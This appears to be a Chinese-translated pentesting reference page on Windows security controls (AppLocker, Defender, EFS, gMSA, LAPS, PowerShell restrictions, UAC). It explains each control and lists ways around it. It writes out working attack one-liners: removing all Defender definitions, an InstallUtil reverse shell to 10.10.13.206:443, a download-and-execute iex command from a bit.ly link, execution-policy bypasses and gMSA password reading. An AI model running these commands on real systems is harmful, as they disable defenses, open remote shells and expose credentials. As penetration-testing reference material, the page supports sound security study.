# Windows 安全控制

{{#include ../banners/hacktricks-training.md}}

## AppLocker 策略

应用白名单是一个已批准软件应用程序或可执行文件的列表，这些软件或文件被允许存在于系统中并运行。其目标是保护环境免受有害 malware 和未经批准的软件影响，避免其不符合组织的特定业务需求。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) 是 Microsoft 的**应用程序白名单解决方案**，允许系统管理员控制**用户可以运行哪些应用程序和文件**。它可以对**可执行文件、脚本、Windows installer 文件、DLL、打包应用和打包应用安装程序**进行**细粒度控制**。\
组织通常会**阻止 cmd.exe 和 PowerShell.exe**，并限制对某些目录的写入权限，**但这些限制都可以被绕过**。

### 检查

检查哪些文件/扩展名被列入黑名单/白名单：
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
`Test-AppLockerPolicy` 会根据 AppLocker policy，评估特定身份可执行的候选文件。应测试将使用其 token 执行 payload 的账户，因为规则可以针对用户或组；`Get-AppLockerFileInformation` 也可用于检查规则可能匹配的路径、哈希和发布者元数据。<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
此注册表路径包含由 AppLocker 应用的配置和策略，可用于查看系统上当前强制执行的规则集：

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- 用于绕过 AppLocker Policy 的实用 **Writable folders**：如果 AppLocker 允许执行 `C:\Windows\System32` 或 `C:\Windows` 中的任意内容，则可以使用其中的 **writable folders** 来 **bypass this**。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 通常被**信任**的 [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries 也可用于绕过 AppLocker。
- **编写不佳的规则也可能被绕过**
- 例如，对于 **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，你可以在任何位置创建一个名为 **`allowed`** 的**文件夹**，这样它就会被允许。
- 组织通常也会重点关注**阻止 `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**，但会忽略其他 [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)，例如 `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 或 `PowerShell_ISE.exe`。
- 由于会给系统带来额外负载，并且需要进行大量测试以确保不会导致任何故障，**DLL enforcement 很少被启用**。因此，使用 **DLLs 作为 backdoors 将有助于绕过 AppLocker**。
- 你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)，在任意进程中**执行 Powershell** code 并绕过 AppLocker。更多信息请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)。<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

本地 credentials 存在于此文件中，passwords 以 hash 形式保存。

### Local Security Authority (LSA) - LSASS

出于 Single Sign-On 的原因，该子系统会将**credentials**（hashed）**保存**在其**memory**中。\
**LSA** 管理本地的**security policy**（password policy、users permissions 等）、**authentication**、**access tokens**……\
LSA 将负责检查 **SAM** 文件中提供的 **credentials**（用于本地登录），并与 **domain controller** 通信以验证 domain user。

**credentials** 保存在 **process LSASS** 中：Kerberos tickets、NT 和 LM hashes，以及可轻松解密的 passwords。

### LSA secrets

LSA 可以在 disk 中保存一些 credentials：

- Active Directory computer account 的 password（无法连接的 domain controller）。
- Windows services accounts 的 passwords
- scheduled tasks 的 passwords
- 更多（IIS applications 的 password……）

### NTDS.dit

这是 Active Directory 的 database。它仅存在于 Domain Controllers 中。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) 是一种 Antivirus，可用于 Windows 10、Windows 11 以及 Windows Server 的各个版本。它会**阻止**常见的 pentesting tools，例如 **`WinPEAS`**。但是，有一些方法可以**绕过这些 protections**。

### Check

要检查 **Defender** 的**status**，可以执行 PS cmdlet **`Get-MpComputerStatus`**（检查 **`RealTimeProtectionEnabled`** 的值，以了解其是否处于 active 状态）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

你也可以运行以下命令来 enumerate：
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 加密文件系统 (EFS)

EFS 通过加密来保护文件，使用称为 **文件加密密钥 (FEK)** 的**对称密钥**。此密钥使用用户的**公钥**加密，并存储在加密文件的 $EFS **备用数据流**中。需要解密时，会使用用户数字证书对应的**私钥**从 $EFS 流中解密 FEK。更多详细信息请参阅[此处](https://en.wikipedia.org/wiki/Encrypting_File_System)。

**无需用户发起的解密场景**包括：

- 当文件或文件夹被移动到非 EFS 文件系统（例如 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)）时，它们会自动解密。
- 通过 SMB/CIFS 协议在网络中发送的加密文件，会在传输前被解密。

这种加密方式允许所有者**透明访问**加密文件。但是，仅更改所有者的密码并登录，并不能进行解密。

**关键要点**：

- EFS 使用对称 FEK，并通过用户的公钥对其加密。
- 解密使用用户的私钥来访问 FEK。
- 在特定条件下会自动解密，例如复制到 FAT32 或进行网络传输时。
- 所有者无需执行其他操作即可访问加密文件。

### 检查 EFS 信息

通过检查此路径是否存在，确认某个**用户**是否**使用过**此**服务**：`C:\users\<username>\appdata\roaming\Microsoft\Protect`

使用 cipher /c \<file>\ 检查**谁**有权**访问**该文件\
你也可以在文件夹内使用 `cipher /e` 和 `cipher /d` 来**加密**和**解密**所有文件

### 解密 EFS 文件

#### 作为 Authority System

此方法要求**受害用户**在主机上**运行**一个**进程**。如果满足条件，则可以从 `meterpreter` 会话中冒充该用户的进程令牌（来自 `incognito` 的 `impersonate_token`）。或者，也可以 `migrate` 到该用户的进程中。

#### 知道用户密码

Mimikatz 可以导入用户的证书和私钥，然后使用它们解密受 EFS 保护的文件。<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## 组托管服务帐户 (gMSA)

Microsoft 开发了**组托管服务帐户 (gMSA)**，用于简化 IT 基础设施中服务帐户的管理。不同于通常启用“**密码永不过期**”设置的传统服务帐户，gMSA 提供了更安全且更易于管理的解决方案：

- **自动密码管理**：gMSA 使用一个复杂的 240 字符密码，并根据域或计算机策略自动更改。此过程由 Microsoft 的密钥分发服务 (KDC) 处理，无需手动更新密码。
- **增强安全性**：这些帐户不会被锁定，也不能用于交互式登录，从而增强了安全性。
- **支持多个主机**：gMSA 可以在多个主机之间共享，非常适合运行在多台服务器上的服务。
- **计划任务功能**：不同于托管服务帐户，gMSA 支持运行计划任务。
- **简化 SPN 管理**：当计算机的 sAMaccount 详细信息或 DNS 名称发生变化时，系统会自动更新服务主体名称 (SPN)，从而简化 SPN 管理。

gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由域控制器 (DC) 每 30 天自动重置一次。该密码是一个称为 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) 的加密数据 blob，只能由经过授权的管理员以及安装了 gMSA 的服务器获取，从而确保环境安全。要访问此信息，需要使用 LDAPS 等安全连接，或者使用 'Sealing & Secure' 对连接进行身份验证。

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

你可以使用 [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**：** 读取此密码。
```
/GMSAPasswordReader --AccountName jkohler
```
[**在此帖子中查找更多信息**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

此外，请查看此[网页](https://cube0x0.github.io/Relaying-for-gMSA/)，了解如何执行 **NTLM relay attack** 以**读取** **gMSA** 的**密码**。<sup>[[3]](#references)</sup>

## LAPS

在 enumeration 期间，应区分 **legacy Microsoft LAPS** 和原生的 **Windows LAPS** 实现。Windows LAPS 随 2023 年 4 月 11 日发布的 Windows 更新一同推出，可以将受管本地管理员密码备份到 **Windows Server Active Directory** 或 **Microsoft Entra ID**。在由 AD 支持的部署中，它还可以加密密码、保留加密的密码历史记录，以及管理域控制器的 DSRM 密码。可下载的 legacy MSI 已在较新的 Windows 版本中弃用，但 Windows LAPS 可以在 legacy-emulation mode 下运行。<sup>[[6]](#references)</sup>

由于 legacy Microsoft LAPS 和 Windows LAPS 是两个独立的实现，因此在应用特定于属性或 cmdlet 的 attacks 之前，应先确定部署的是哪一种。链接页面介绍了 discovery、ACL enumeration、retrieval、expiration manipulation 和 offline recovery，本文不重复这些过程。<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **锁定了许多有效使用 PowerShell 所需的功能**，例如阻止 COM objects、仅允许 approved .NET types、基于 XAML 的 workflows、PowerShell classes 等。

### **检查**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### 绕过
```bash
#Easy bypass
Powershell -version 2
```
在当前版本的 Windows 中，该 Bypass 将无法工作，但你可以使用 [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。\
**要编译它，你可能需要** **添加** _**引用**_ -> _浏览_ ->_浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`，并**将项目更改为 .Net4.5**。

#### 直接 bypass：
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 在任意进程中 **execute Powershell** 代码，并绕过受限模式。更多信息请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)。<sup>[[1]](#references)</sup>

## PS 执行策略

默认情况下，它被设置为 **restricted.** 绕过此策略的主要方法：<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## 安全支持提供程序接口 (SSPI)

这是一个可用于对用户进行身份验证的 API。

SSPI 负责为希望通信的两台机器寻找合适的协议。首选方法是 Kerberos。随后，SSPI 会协商要使用的身份验证协议。这些身份验证协议称为 Security Support Provider (SSP)，以 DLL 的形式位于每台 Windows 机器中，并且两台机器必须支持相同的 SSP 才能进行通信。

### 主要 SSP

- **Kerberos**：首选协议
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 和 **NTLMv2**：出于兼容性原因
- %windir%\Windows\System32\msv1_0.dll
- **Digest**：用于 Web servers 和 LDAP，密码以 MD5 hash 的形式存在
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**：SSL 和 TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**：用于协商要使用的协议（Kerberos 或 NTLM，其中 Kerberos 为默认协议）
- %windir%\Windows\System32\lsasrv.dll

#### 协商可能提供多种方法，也可能只提供一种方法。

## UAC - 用户账户控制

[用户账户控制 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一项能够为**提升权限的活动显示同意提示**的功能。

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [绕过 AppLocker 和 PowerShell 受限语言模式](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [howto ~ 解密 EFS 文件](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSA 的 Relaying](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [绕过 PowerShell 执行策略的 15 种方法](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [使用 AppLocker Windows PowerShell cmdlets](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Windows LAPS 概述](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
